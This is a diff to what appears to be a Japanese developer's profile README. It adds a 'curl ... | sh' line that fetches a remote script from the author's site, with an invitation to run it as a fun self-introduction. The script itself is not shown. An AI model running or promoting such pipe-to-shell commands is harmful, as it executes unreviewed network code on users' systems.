@@ -3,7 +3,10 @@
 Webを中心に、いろいろなものを作っています。
 
 HTML、CSS、JavaScriptを使ったフロントエンド開発から、Node.jsやPythonを使ったバックエンド・ツール開発まで、興味を持ったものを実際に作りながら学んでいます。
-
+```
+curl -s https://qianyu15.github.io/hello.sh | sh
+```
+↑これ自己紹介コマンドです。面白いのでぜひ実行してみてください!
 ## 🛠️ 技術スタック
 
 ### Languages
